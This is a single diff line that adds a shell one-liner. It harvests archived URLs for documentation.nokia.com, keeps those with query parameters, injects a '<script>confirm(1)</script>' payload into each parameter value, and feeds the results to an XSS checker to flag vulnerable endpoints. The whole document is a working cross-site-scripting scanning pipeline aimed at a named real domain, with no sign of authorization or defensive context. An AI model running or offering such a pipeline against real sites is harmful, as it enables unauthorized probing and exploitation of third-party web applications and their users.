@@ -1,0 +1,1 @@
+echo "documentation.nokia.com" | waybackurls | egrep -iv ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|icon|pdf|svg|txt|js)" | grep -IE "[?].* [&]?" | grep "=" | anew -p | python3 /root/Tools/pvreplace/pvreplace.py '<script>confirm(1)</script>, <script>confirm(1)</script>' | xss checker -match '<script>confirm(1)</script>, <script>confirm(1)</script>' -vuln
